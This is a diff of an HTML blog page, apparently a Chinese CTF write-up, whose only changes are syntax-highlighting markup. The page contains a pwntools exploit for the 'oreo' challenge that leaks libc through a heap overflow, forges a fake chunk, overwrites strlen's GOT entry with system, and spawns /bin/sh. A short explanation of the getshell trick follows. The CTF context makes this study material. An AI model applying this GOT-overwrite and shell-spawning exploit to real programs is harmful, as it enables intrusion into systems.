@@ -392,55 +392,55 @@
 <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./oreo"</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">)</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">"debug"</span>
 
 <span class="c1"># address
-</span><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
-<span class="n">printf_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_libc</span><span class="p">))</span>
-<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc</span><span class="p">))</span>
+</span><span class="n">printf_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_got</span><span class="p">))</span>
+<span class="n">printf_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_libc</span><span class="p">))</span>
+<span class="n">system_libc</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_libc -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_libc</span><span class="p">))</span>
 <span class="n">message_addr</span> <span class="o">=</span> <span class="mh">0x0804a2a8</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"message_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">message_addr</span><span class="p">))</span>
-<span class="n">strlen_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">]</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"strlen_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"message_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">message_addr</span><span class="p">))</span>
+<span class="n">strlen_got</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">'strlen'</span><span class="p">]</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"strlen_got -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">strlen_got</span><span class="p">))</span>
 
 
 <span class="k">def</span> <span class="nf">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="n">desc</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">desc</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">show_refles</span><span class="p">():</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">leave_message</span><span class="p">(</span><span class="n">content</span><span class="p">):</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">leak_addr</span><span class="p">():</span>
     <span class="n">name</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">printf_got</span><span class="p">)</span>
     <span class="n">desc</span> <span class="o">=</span> <span class="s">'b'</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
     
     <span class="c1"># add refle and overwrite the prev_riles
 </span>    <span class="n">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
 
     <span class="c1"># leak printf_addr
 </span>    <span class="n">show_refles</span><span class="p">()</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
-    <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Description: "</span><span class="p">)</span>
+    <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">sh</span><span class="p">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"printf_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">printf_addr</span><span class="p">))</span>
 
     <span class="k">return</span> <span class="n">printf_addr</span>
 
 <span class="k">def</span> <span class="nf">get_system_addr</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">libc_addr</span><span class="p">):</span>
     <span class="n">base</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="n">libc_addr</span>
     <span class="n">system_addr</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="n">system_libc</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"system_addr -&gt; "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
     <span class="k">return</span> <span class="n">system_addr</span>
 
 <span class="k">def</span> <span class="nf">fake_chunk</span><span class="p">():</span>
@@ -451,12 +451,12 @@
     <span class="c1"># make a chunk to set the house into link
 </span>    <span class="n">name</span> <span class="o">=</span> <span class="s">'a'</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">message_addr</span><span class="p">)</span>
     <span class="n">desc</span> <span class="o">=</span> <span class="s">"fuck U!"</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"name -&gt; "</span> <span class="o">+</span> <span class="n">name</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"desc -&gt; "</span> <span class="o">+</span> <span class="n">desc</span><span class="p">)</span>
     <span class="n">add_refles</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">desc</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">order_refles</span><span class="p">():</span>
-    <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"3"</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
     <span class="n">printf_addr</span> <span class="o">=</span> <span class="n">leak_addr</span><span class="p">()</span>
@@ -477,13 +477,13 @@
 
     <span class="n">leave_message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span><span class="o">+</span> <span class="s">";/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
 
-    <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+    <span class="n">sh</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 
 <span class="n">main</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>  这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传<code class="highlighter-rouge">p32(system_addr) + ";/bin/sh\x00"</code>.因为,在strlen被覆盖之后，会执行<code class="highlighter-rouge">addEnd()</code>函数，相当于<code class="highlighter-rouge">strlen(p32(system_addr) + ";/bin/sh\x00".)</code>即<code class="highlighter-rouge">system(p32(system_addr)) 和 system("/bin/sh\x00")</code>这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入<code class="highlighter-rouge">/bin/sh</code>也可getshell。</p>
+<p>  这里有个点值得注意，我们最后一步覆盖system_got的时候可以直接传<code class="language-plaintext highlighter-rouge">p32(system_addr) + ";/bin/sh\x00"</code>.因为,在strlen被覆盖之后，会执行<code class="language-plaintext highlighter-rouge">addEnd()</code>函数，相当于<code class="language-plaintext highlighter-rouge">strlen(p32(system_addr) + ";/bin/sh\x00".)</code>即<code class="language-plaintext highlighter-rouge">system(p32(system_addr)) 和 system("/bin/sh\x00")</code>这样就可以快速getshell。当然，也可以覆盖其他函数的got表，比如sscanf，然后在输入的action的时候输入<code class="language-plaintext highlighter-rouge">/bin/sh</code>也可getshell。</p>
 
 <p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/oreo.png?raw=true" alt="shell" /></p>
 
